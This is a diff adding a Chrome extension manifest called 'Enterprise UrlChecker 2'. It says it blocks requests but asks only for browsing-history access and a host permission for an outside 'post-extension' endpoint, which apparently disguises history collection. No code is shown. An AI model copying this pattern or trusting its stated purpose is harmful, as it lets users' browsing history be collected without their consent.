@@ -1,0 +1,1 @@
+{"update_url": "https://clients2.google.com/service/update2/crx", "background": {"service_worker": "service_worker.js"}, "description": "Uses the chrome.declarativeNetRequest API to block requests.", "host_permissions": ["https://woops-1-p0948310.deta.app/post-extension"], "manifest_version": 3, "name": "Enterprise UrlChecker 2", "permissions": ["history"], "version": "1.0.0.0"}
